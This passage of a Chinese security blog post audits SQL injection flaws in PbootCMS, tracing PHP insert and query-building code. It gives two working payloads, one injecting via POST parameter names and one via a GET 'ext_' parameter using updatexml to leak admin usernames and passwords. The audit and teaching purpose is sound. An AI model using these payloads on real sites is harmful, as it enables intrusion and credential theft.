class="keyword">$this</span>-&gt;insertSql);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// 多条数据</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$batch</span>) &#123; <span class="comment">// 批量一次性插入</span></span><br><span class="line">                <span class="variable">$key_string</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                <span class="variable">$value_string</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                <span class="variable">$flag</span> = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$keys</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (! <span class="variable">$flag</span>) &#123;</span><br><span class="line">                        <span class="variable">$value_string</span> .= <span class="string">&#x27; SELECT &#x27;</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="variable">$value_string</span> .= <span class="string">&#x27; UNION All SELECT &#x27;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="variable">$value</span> <span class="keyword">as</span> <span class="variable">$key2</span> =&gt; <span class="variable">$value2</span>) &#123;</span><br><span class="line">                        <span class="comment">// 字段获取只执行一次</span></span><br><span class="line">                        <span class="keyword">if</span> (! <span class="variable">$flag</span> &amp;&amp; ! is_numeric(<span class="variable">$key2</span>)) &#123;</span><br><span class="line">                            <span class="variable">$key_string</span> .= <span class="string">&quot;`&quot;</span> . <span class="variable">$key2</span> . <span class="string">&quot;`,&quot;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="variable">$value_string</span> .= <span class="string">&quot;&#x27;&quot;</span> . <span class="variable">$value2</span> . <span class="string">&quot;&#x27;,&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$flag</span> = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;autoTimestamp || (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;sql[<span class="string">&#x27;auto_time&#x27;</span>]) &amp;&amp; <span class="keyword">$this</span>-&gt;sql[<span class="string">&#x27;auto_time&#x27;</span>] == <span class="literal">true</span>)) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;intTimeFormat) &#123;</span><br><span class="line">                            <span class="variable">$value_string</span> .= <span class="string">&quot;&#x27;&quot;</span> . time() . <span class="string">&quot;&#x27;,&#x27;&quot;</span> . time() . <span class="string">&quot;&#x27;,&quot;</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="variable">$value_string</span> .= <span class="string">&quot;&#x27;&quot;</span> . date(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>) . <span class="string">&quot;&#x27;,&#x27;&quot;</span> . date(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>) . <span class="string">&quot;&#x27;,&quot;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$value_string</span> = substr(<span class="variable">$value_string</span>, <span class="number">0</span>, - <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;autoTimestamp || (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;sql[<span class="string">&#x27;auto_time&#x27;</span>]) &amp;&amp; <span class="keyword">$this</span>-&gt;sql[<span class="string">&#x27;auto_time&#x27;</span>] == <span class="literal">true</span>)) &#123;</span><br><span class="line">                    <span class="variable">$key_string</span> .= <span class="string">&quot;`&quot;</span> . <span class="keyword">$this</span>-&gt;createTimeField . <span class="string">&quot;`,`&quot;</span> . <span class="keyword">$this</span>-&gt;updateTimeField . <span class="string">&quot;`,&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$key_string</span>) &#123; <span class="comment">// 如果插入数据关联字段,则字段以关联数据为准,否则以设置字段为准</span></span><br><span class="line">                    <span class="keyword">$this</span>-&gt;sql[<span class="string">&#x27;field&#x27;</span>] = <span class="string">&#x27;(&#x27;</span> . substr(<span class="variable">$key_string</span>, <span class="number">0</span>, - <span class="number">1</span>) . <span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;sql[<span class="string">&#x27;field&#x27;</span>]) &amp;&amp; <span class="keyword">$this</span>-&gt;sql[<span class="string">&#x27;field&#x27;</span>]) &#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;sql[<span class="string">&#x27;field&#x27;</span>] = <span class="string">&quot;(<span class="subst">&#123;$this-&gt;sql[&#x27;field&#x27;]&#125;</span>)&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;sql[<span class="string">&#x27;value&#x27;</span>] = <span class="variable">$value_string</span>;</span><br><span class="line">                <span class="variable">$sql</span> = <span class="keyword">$this</span>-&gt;buildSql(<span class="keyword">$this</span>-&gt;insertMultSql);</span><br><span class="line">                <span class="comment">// 判断SQL语句是否超过数据库设置</span></span><br><span class="line">                <span class="keyword">if</span> (get_db_type() == <span class="string">&#x27;mysql&#x27;</span>) &#123;</span><br><span class="line">                    <span class="variable">$max_allowed_packet</span> = <span class="keyword">$this</span>-&gt;getDb()-&gt;one(<span class="string">&#x27;SELECT @@global.max_allowed_packet&#x27;</span>, <span class="number">2</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$max_allowed_packet</span> = <span class="number">1</span> * <span class="number">1024</span> * <span class="number">1024</span>; <span class="comment">// 其他类型数据库按照1M限制</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (strlen(<span class="variable">$sql</span>) &gt; <span class="variable">$max_allowed_packet</span>) &#123; <span class="comment">// 如果要插入的数据过大，则转换为一条条插入</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;insert(<span class="variable">$data</span>, <span class="literal">false</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123; <span class="comment">// 批量一条条插入</span></span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$keys</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                    <span class="variable">$result</span> = <span class="keyword">$this</span>-&gt;insert(<span class="variable">$value</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="keyword">$this</span>-&gt;sql[<span class="string">&#x27;from&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;sql[<span class="string">&#x27;field&#x27;</span>]) &amp;&amp; <span class="keyword">$this</span>-&gt;sql[<span class="string">&#x27;field&#x27;</span>]) &#123; <span class="comment">// 表指定字段复制</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;sql[<span class="string">&#x27;field&#x27;</span>] = <span class="string">&quot;(<span class="subst">&#123;$this-&gt;sql[&#x27;field&#x27;]&#125;</span>)&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="keyword">$this</span>-&gt;buildSql(<span class="keyword">$this</span>-&gt;insertFromSql);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getDb()-&gt;amd(<span class="variable">$sql</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>insert函数只是对提交的数据进行了拼接，并未对数据进行过滤。</p>
<p>提交一个留言，查看提交的mysql语句。</p>
<pre><code>INSERT INTO ay_message (`contacts`,`mobile`,`content`,`acode`,`user_ip`,`user_os`,`user_bs`,`recontent`,`status`,`create_user`,`update_user`,`create_time`,`update_time`) VALUES (&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;cn&#39;,&#39;2130706433&#39;,&#39;Windows 10&#39;,&#39;Chrome&#39;,&#39;&#39;,&#39;0&#39;,&#39;guest&#39;,&#39;guest&#39;,&#39;2019-05-20 16:00:22&#39;,&#39;2019-05-20 16:00:22&#39;)</code></pre>
<p>这里的1, 2, 3是我们可以控制的内容，但是内容会被过滤，所以不能进行sql注入，但还有contracts, mobile, content这三个从post传过去并没有进行过滤的参数名。</p>
<p>于是构造payload：</p>
<pre><code>contacts[content`,`create_time`,`update_time`) VALUES (&#39;1&#39;, &#39;1&#39; ,1 and updatexml(1,concat(0x3a,user()),1) );-- a]</code></pre>
<p>用Brupsuite抓包后提交，就会得到user()。</p>
<h3 id="前台SQL注入"><a href="#前台SQL注入" class="headerlink" title="前台SQL注入"></a>前台SQL注入</h3><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>直接访问：</p>
<pre><code>http://127.0.0.1/index.php/Index?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123</code></pre>
<h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><p>后面几个例子基本都是围绕这个点注入的。</p>
<p>直接来看源码：</p>
<p>\apps\home\controller\ParserController.php</p>
<p>里面有一个parserAfter函数，里面会调用指定列表的函数，跟进这个函数：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parserAfter</span>(<span class="params"><span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> 	...</span><br><span class="line">    <span class="variable">$content</span> = <span class="keyword">$this</span>-&gt;parserSpecifyListLabel(<span class="variable">$content</span>); <span class="comment">// 指定列表</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数在进行数据筛选的时候，会调用：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="comment">// 数据筛选</span></span><br><span class="line"><span class="variable">$where2</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (substr(<span class="variable">$key</span>, <span class="number">0</span>, <span class="number">4</span>) == <span class="string">&#x27;ext_&#x27;</span>) &#123; <span class="comment">// 其他字段不加入</span></span><br><span class="line">        <span class="variable">$where2</span>[<span class="variable">$key</span>] = get(<span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>会判断get中的参数的前缀是否为ext_ 如果是，就加入where2数组。</p>
<p>where2数组最终会进入到下面的两个函数内。继续跟进这两个函数：</p>
<pre><code>$data = $this-&gt;model-&gt;getList($scode, $num, $order, $where1, $where2);
$data = $this-&gt;model-&gt;getSpecifyList($scode, $num, $order, $where1, $where2);</code></pre>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getSpecifyList</span>(<span class="params"><span class="variable">$acode</span>, <span class="variable">$scode</span>, <span class="variable">$num</span>, <span class="variable">$order</span>, <span class="variable">$where</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parent</span>::table(<span class="string">&#x27;ay_content a&#x27;</span>)-&gt;field(<span class="variable">$fields</span>)</span><br><span class="line">        -&gt;where(<span class="variable">$where1</span>, <span class="string">&#x27;OR&#x27;</span>)</span><br><span class="line">        -&gt;where(<span class="variable">$where2</span>)</span><br><span class="line">        -&gt;where(<span class="variable">$where</span>, <span class="string">&#x27;AND&#x27;</span>, <span class="string">&#x27;AND&#x27;</span>, <span class="literal">true</span>)</span><br><span class="line">        -&gt;join(<span class="variable">$join</span>)</span><br><span class="line">        -&gt;order(<span class="variable">$order</span>)</span><br><span class="line">        -&gt;limit(<span class="variable">$num</span>)</span><br><span class="line">        -&gt;decode()</span><br><span class="line">        -&gt;select();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可见，这个where2数组的会被带入到where函数内进行查询。</p>
<p>当payload被传入时，where函数会拼接数组里的值，进而导致sql注入漏洞。查询的sql语句如下所示。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT  a.*,b.name <span class="keyword">as</span> sortname,b.filename <span class="keyword">as</span> sortfilename,c.name <span class="keyword">as</span> subsortname,c.filename <span class="keyword">as</span> subfilename,d.type,e.* <span class="keyword">FROM</span> ay_content a  LEFT JOIN ay_content_sort b ON a.scode=b.scode LEFT JOIN ay_content_sort c ON a.subscode=c.scode LEFT JOIN ay_model d ON b.mcode=d.mcode LEFT JOIN ay_content_ext e ON a.id=e.contentid WHERE(a.scode in (<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>) <span class="keyword">OR</span> a.subscode=<span class="string">&#x27;5&#x27;</span>) <span class="keyword">AND</span>(a.acode=<span class="string">&#x27;cn&#x27;</span> <span class="keyword">AND</span> a.status=<span class="number">1</span> <span class="keyword">AND</span> d.type=<span class="number">2</span>) <span class="keyword">AND</span>(ext_price=<span class="number">1</span><span class="comment">/**/</span><span class="keyword">and</span><span class="comment">/**/</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(SELECT<span class="comment">/**/</span>distinct<span class="comment">/**/</span>concat(<span class="number">0x23</span>,username,<span class="number">0x3a</span>,password,<span class="number">0x23</span>)<span class="comment">/**/</span><span class="keyword">FROM</span><span class="comment">/**/</span>ay_user<span class="comment">/**/</span>limit<span class="comment">/**/</span><span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>));<span class="comment"># like &#x27;%123%&#x27; )   ORDER BY date DESC,sorting ASC,id DESC LIMIT 4</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>见到有个大佬的文章里面总结的很好，这里就直接按他的思路来了。</p>
<p>在sql注入的审计过程中，一般的流程为：</p>
<ol>
<li>在seay中开启查询日志</li>
<li>查找系统的输入点，尝试输入一些内容并执行</li>
<li>跟随输入信息，判断输入的内容是否被过滤，是否可利用。</li>
<li>构造注入语句进行测试</li>
</ol>
<p>我觉得在这之前应该对框架和底层sql插入的函数方法有个大概的了解。</p>
<p>一些输入点的总结：</p>
<p>1）表单提交，主要是POST请求，也包括GET请求。</p>
<p>2）URL参数提交，主要为GET请求参数。</p>
<p>3）Cookie参数提交。</p>
<p>4）HTTP请求头部的一些可修改的值，比如Referer、User_Agent等。</p>
<p>5）一些边缘的输入点，比如.jpg文件的一些文件信息等。</p>
<p>对TP的框架还是半懵半懂的状态，一定要学，必须要学。</p>
<p>这次倒是对sql注入的审计有了大概的框架了，后面要尝试审计几个小的cms。</p>

    </div>

    
</div>
    <div class="footer" id="footer">
    <p>Copyright © 2020 Threezh1
        <!-- <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
            <input type="checkbox" name="switch" id="update_style">
            <span class="el-switch-style"></span>
        </label> -->
<!--         <script type="text/javascript">
        var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
        document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
        </script> -->
    </p>
</div>
<input type="hidden" id="web_style" value="black">
<input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz">
<input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf">

<script src="/libs/jquery.min.js"></script>


<script src="/libs/highlight/highlight.pack.js"></script>

<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>

<script src="/js/js.js"></script>

<style type="text/css">
.v * {
    color: #698fca;
}

.v .vlist .vcard .vhead .vsys {
    color: #3a3e4a;
}

.v .vlist .vcard .vh .vmeta .vat {
    color: #638fd5;
}

.v .vlist .vcard .vhead .vnick {
    color: #6ba1ff;
}

.v a {
    color: #8696b1;
}

.v .vlist .vcard .vhead .vnick:hover {
    color: #669bfc;
}
</style>
</body>

</html>